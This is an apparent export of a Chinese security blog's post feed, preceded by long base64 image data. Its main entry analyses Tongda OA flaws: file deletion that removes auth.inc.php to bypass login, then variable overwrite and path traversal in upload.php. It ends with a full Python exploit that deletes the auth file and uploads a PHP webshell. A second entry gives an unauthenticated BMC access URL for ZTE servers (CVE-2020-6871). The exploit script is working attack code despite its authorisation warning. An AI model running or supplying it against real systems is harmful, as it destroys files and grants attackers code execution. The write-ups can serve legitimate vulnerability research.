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"><img src="data:image/png;base64,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" alt="img"></a></p>
<p><a href="data:image/png;base64,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">img</a></p>
<p>这里呢，简单来讲就是把auth.inc.php给包含进来，如果没有对应session的话，auth.inc.php就会作为“拦路虎”，让用户去登陆，但是删掉会怎么样？</p>
<p>这里就要看php里面include和require的区别了</p>
<p>这两个东西看起来很相似,都是包含嘛，但是稍稍学过洋文的都知道，include的意思指的是包含，而require却有要求的意思，在这里就可以看出点区别了。</p>
<p>如果要包含的文件找不着，include就索性跳过去了，而require是要求，感觉更加强烈一些，找不着文件就fatal error停止不前了。</p>
<p>而恰巧通达OA里面用的都是include，于是如果发现auth.inc.php失踪了，就会直接跳过去!</p>
<p>因此我们只需要利用前面的漏洞，删掉auth.inc.php，即可跳过通达OA里面大部分身份验证！</p>
<p>其中的代码验证SESSION判断是否登录</p>
<h1 id="变量覆盖和任意文件上传"><a href="#变量覆盖和任意文件上传" class="headerlink" title="变量覆盖和任意文件上传"></a>变量覆盖和任意文件上传</h1><p>这里我们看到general/data_center/utils/upload.php</p>
<p>这前面包含的header.inc.php会将$_REQUEST中的所有东西注册成变量</p>
<p>（没找到大佬说的位置）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909162931818-20200914140743298.png" alt="img"></p>
<p>可以尝试使用变量覆盖</p>
<p>漏洞点在图中最后一个else</p>
<p>$repkid可控，然后传参数时加入../../../跳到别的目录（因为通达OA的nginx配置中，上传文件所在的attachment目录里面的PHP不准访问，因此必须要跳出去）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909162931777-20200914140806788.png" alt="img"></p>
<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本POC不是无损利用的，会让对方系统文件被删除导致无法正常工作并且由于目标系统及网络环境不可控，该漏洞也不可能编写出在任何情况下都完全无损的EXP使用时请一定一定要慎重，一定要获取对方书面授权再使用如果仅仅想要检测漏洞的存在性，可以自己编写脚本只检测&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php是否存在 import requeststarget&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8203&#x2F;&quot;payload&#x3D;&quot;&lt;?php echo 123456 ?&gt;&quot;print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)input(&quot;Press enter to continue&quot;)print(&quot;[*]Deleting auth.inc.php....&quot;) url&#x3D;target+&quot;&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php?guid&#x3D;..&#x2F;..&#x2F;..&#x2F;webroot&#x2F;inc&#x2F;auth.inc.php&quot;requests.get(url&#x3D;url)print(&quot;[*]Checking if file deleted...&quot;)url&#x3D;target+&quot;&#x2F;inc&#x2F;auth.inc.php&quot;page&#x3D;requests.get(url&#x3D;url).textif &#39;No input file specified.&#39; not in page:    print(&quot;[-]Failed to deleted auth.inc.php&quot;)    exit(-1)print(&quot;[+]Successfully deleted auth.inc.php!&quot;)print(&quot;[*]Uploading payload...&quot;)url&#x3D;target+&quot;&#x2F;general&#x2F;data_center&#x2F;utils&#x2F;upload.php?action&#x3D;upload&amp;filetype&#x3D;nmsl&amp;repkid&#x3D;&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;&quot;files &#x3D; &#123;&#39;FILE1&#39;: (&#39;hack.php&#39;, payload)&#125;requests.post(url&#x3D;url,files&#x3D;files)url&#x3D;target+&quot;&#x2F;_hack.php&quot;page&#x3D;requests.get(url&#x3D;url).textif &#39;No input file specified.&#39; not in page:    print(&quot;[+]Filed Uploaded Successfully&quot;)    print(&quot;[+]URL:&quot;,url)else:    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>通达OA</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2020-6871)ZTE R5300G4、R8500G4和R5500G4 未授权访问漏洞</title>
    <url>/2020/09/12/IOT/Exploit/ZTE/CVE-2020-6871-ZTE-R5300G4%E3%80%81R8500G4%E5%92%8CR5500G4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ZTE R5300G4、R8500G4和R5500G4中的服务器管理软件模块存在安全漏洞。攻击者可利用该漏洞绕过服务器的身份验证并执行命令。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ZTE R5300G4 V03.08.0100版本，V03.07.0300版本，V03.07.0200版本，V03.07.0108版本，V03.07.0100版本，V03.05.0047版本，V03.05.0046版本，V03.05.0045版本，V03.05.0044版本，V03.05.0043版本，V03.05.0040版本，V03.04.0020版本；R8500G4 V03.07.0103版本，V03.07.0101版本，V03.06.0100版本，V03.05.0400版本，V03.05.0020；R5500G4 V03.08.0100版本，V03.07.0200版本，V03.07.0100版本，V03.06.0100版本。</p>
<a id="more"></a>

<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><blockquote>
<p>未登录状态下直接访问</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com&#x2F;Java&#x2F;jviewer.jnlp?EXTRNIP&#x3D;设备BMC管理口ip&amp;JNLPSTR&#x3D;JViewer</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>ZTE</tag>
      </tags>
  </entry>
  <entry>
    <title>JCG路由器命令执行漏洞</title>
